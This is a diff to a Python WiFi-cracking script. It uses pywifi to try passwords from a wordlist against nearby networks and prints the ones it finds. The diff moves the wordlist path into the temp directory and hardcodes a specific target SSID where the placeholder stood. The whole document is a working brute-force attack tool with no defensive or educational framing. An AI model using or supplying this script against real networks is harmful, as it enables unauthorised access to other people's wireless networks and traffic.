@@ -1,6 +1,13 @@
 import time
 import pywifi
 from pywifi import const
+import os
+import tempfile
+
+def get_pass_file_path():
+    temp_dir = tempfile.gettempdir()
+    pass_file_path = os.path.join(temp_dir, 'pass.txt')
+    return pass_file_path
 
 def connect_to_network(iface, ssid, key=None):
     iface.remove_all_network_profiles()
@@ -19,7 +26,7 @@ def connect_to_network(iface, ssid, key=None):
 wifi = pywifi.PyWiFi()
 interface = wifi.interfaces()[0]
 
-selected_ssid = "YOUR_SSID_HERE"  # Replace 'YOUR_SSID_HERE' with the SSID you want to crack.
+selected_ssid = "ATTBJgMkwa"  # Replace 'YOUR_SSID_HERE' with the SSID you want to crack.
 
 print("\033[36m\nWelcome, \033[35mGamer.\n\n\033[36mLet's try to crack some SSIDs!\n\n\033[33mChecking if SSID has password...\033[37m")
 
@@ -29,7 +36,9 @@ time.sleep(5)
 scan_results = interface.scan_results()
 available_devices = [(result.ssid, result.bssid) for result in scan_results]
 
-with open('pass.txt', 'r') as f:
+pass_file_path = get_pass_file_path()
+
+with open(pass_file_path, 'r') as f:
     keys = [line.strip() for line in f]
 
 final_output = {}
@@ -53,7 +62,7 @@ for ssid, mac_address in available_devices:
         else:
             print('\033[31mFailed to crack the password of the network\033[37m', ssid)
 
-        break
+        break 
 
 print("\n" + '*' * 10, 'Discovered Password', '*' * 10)
 print("{0:<12} {1:<}".format("SSID", "PASSWORD"))
